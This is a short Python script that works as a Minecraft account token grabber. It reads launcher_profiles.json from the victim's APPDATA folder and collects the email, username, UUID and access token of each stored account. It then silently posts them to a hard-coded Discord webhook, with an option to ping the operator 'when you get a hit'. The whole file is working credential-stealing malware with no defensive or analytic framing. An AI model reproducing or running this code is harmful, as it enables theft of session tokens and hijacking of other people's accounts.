import json
import os
from urllib.request import Request, urlopen

# your webhook URL
WEBHOOK_URL = "https://discordapp.com/api/webhooks/1025788831544397936/sQuVUsVksUfZ3K8gwIjAfugpxoKGnnsfb7TfYZqalcHs1bUP0xz20Zm39RXjpa7kGz-N"

# mentions you when you get a hit
PING_ME = False

def uuid_dashed(uuid):
    return f"{uuid[0:8]}-{uuid[8:12]}-{uuid[12:16]}-{uuid[16:21]}-{uuid[21:32]}"

def main():
    auth_db = json.loads(open(os.getenv("APPDATA") + "\\.minecraft\\launcher_profiles.json").read())["authenticationDatabase"]

    embeds = []

    for x in auth_db:
        try:
            email = auth_db[x].get("username")
            uuid, display_name_object = list(auth_db[x]["profiles"].items())[0]
            embed = {
                "fields": [
                    {"name": "Email", "value": email if email and "@" in email else "N/A", "inline": False},
                    {"name": "Username", "value": display_name_object["displayName"].replace("_", "\\_"), "inline": True},
                    {"name": "UUID", "value": uuid_dashed(uuid), "inline": True},
                    {"name": "Token", "value": auth_db[x]["accessToken"], "inline": True}
                ]
            }
            embeds.append(embed)
        except:
            pass

    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
    }

    payload = json.dumps({"embeds": embeds, "content": "@everyone" if PING_ME else ""})
    
    try:
        req = Request(WEBHOOK_URL, data=payload.encode(), headers=headers)
        urlopen(req)
    except:
        pass

if __name__ == "__main__":
    main()
